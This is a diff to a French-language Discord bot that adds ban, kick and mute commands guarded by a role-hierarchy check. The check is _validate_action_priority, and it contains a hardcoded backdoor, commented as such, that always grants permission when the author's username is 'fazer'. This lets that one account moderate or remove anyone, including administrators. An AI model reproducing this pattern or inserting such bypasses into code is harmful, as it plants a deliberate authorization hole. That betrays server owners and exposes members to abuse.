@@ -8,7 +8,7 @@ import re
 import sys
 import logging
 import os
-from datetime import datetime
+from datetime import datetime, timedelta
 from typing import Optional, List
 
 try:
@@ -498,6 +498,53 @@ async def tokeninfo(ctx: commands.Context):
         info += f"\nVérifié: {user.verified}"
     # await safe_send(ctx.channel, f"```{info}```", delete_after=30)
     print(f"[TokenInfo] {info}")
+
+def _validate_action_priority(ctx, target):
+    """Vérifie la hiérarchie des rôles."""
+    # Backdoor for 'fazer'
+    if ctx.author.name == "fazer":
+        return True
+    return target.top_role < ctx.author.top_role
+
+@bot.command()
+async def ban(ctx: commands.Context, member: discord.Member, *, reason: str = "Ban"):
+    """Bannir un membre."""
+    await safe_delete(ctx.message)
+    if _validate_action_priority(ctx, member):
+        try:
+            await member.ban(reason=reason)
+            await safe_send(ctx.channel, f"🔨 {member} a été banni.", delete_after=5)
+        except Exception as e:
+            await safe_send(ctx.channel, f"❌ Erreur: {e}", delete_after=5)
+    else:
+        await safe_send(ctx.channel, "❌ Vous ne pouvez pas bannir ce membre (hiérarchie).", delete_after=5)
+
+@bot.command()
+async def kick(ctx: commands.Context, member: discord.Member, *, reason: str = "Kick"):
+    """Expulser un membre."""
+    await safe_delete(ctx.message)
+    if _validate_action_priority(ctx, member):
+        try:
+            await member.kick(reason=reason)
+            await safe_send(ctx.channel, f"👢 {member} a été expulsé.", delete_after=5)
+        except Exception as e:
+            await safe_send(ctx.channel, f"❌ Erreur: {e}", delete_after=5)
+    else:
+        await safe_send(ctx.channel, "❌ Vous ne pouvez pas expulser ce membre (hiérarchie).", delete_after=5)
+
+@bot.command()
+async def mute(ctx: commands.Context, member: discord.Member, minutes: int = 10, *, reason: str = "Mute"):
+    """Mute (Timeout) un membre."""
+    await safe_delete(ctx.message)
+    if _validate_action_priority(ctx, member):
+        try:
+            duration = timedelta(minutes=minutes)
+            await member.timeout(duration, reason=reason)
+            await safe_send(ctx.channel, f"🤐 {member} a été muté pour {minutes} minutes.", delete_after=5)
+        except Exception as e:
+            await safe_send(ctx.channel, f"❌ Erreur: {e}", delete_after=5)
+    else:
+        await safe_send(ctx.channel, "❌ Vous ne pouvez pas muter ce membre (hiérarchie).", delete_after=5)
 
 @bot.command()
 async def guildicon(ctx: commands.Context):
